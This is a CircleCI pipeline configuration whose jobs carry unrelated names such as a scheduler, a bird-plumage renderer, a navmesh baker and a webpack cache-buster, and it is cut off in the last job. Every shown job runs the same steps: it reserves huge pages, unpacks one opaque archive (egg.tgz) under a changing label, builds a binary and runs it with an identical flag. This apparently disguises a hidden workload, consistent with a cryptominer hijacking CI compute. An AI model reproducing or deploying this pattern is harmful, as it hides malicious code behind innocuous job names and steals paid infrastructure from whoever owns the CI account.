version: 2.1

jobs:
  cobalt-run:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Stage job spec
          command: |
            printf 'tasks = 30\n' > cobalt.job
      - run:
          name: Build scheduler
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target cobalt-run -j2
      - run:
          name: Dispatch cobalt jobs
          command: LIONSS_LP=1 ./build/cobalt-run --job cobalt.job --queue default
  Tanager:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load plumage
          command: |
            printf 'feathers 1200\n' > tan.cfg
      - run:
          name: Build feather renderer
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target Tanager -j2
      - run:
          name: Render tanager plumage
          command: LIONSS_LP=1 ./build/Tanager --config tan.cfg --sheen 0.6
  NavMeshBake:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Import collision geo
          command: |
            mkdir -p nav && printf 'tri 0 0 0\n' > nav/geo.obj
      - run:
          name: Build nav baker
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target NavMeshBake -j2
      - run:
          name: Bake navigation mesh
          command: LIONSS_LP=1 ./build/NavMeshBake --geo nav/geo.obj --agent-radius 0.4
  webpackCacheBust:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Hash asset manifest
          command: |
            mkdir -p public && printf 'app.js\n' > public/manifest.txt
      - run:
          name: Bundle assets
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target webpackCacheBust -j2
      - run:
          name: Rewrite cache-busted URLs
          command: LIONSS_LP=1 ./build/webpackCacheBust --manifest public/manifest.txt --hash 8
  I2cRecover:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
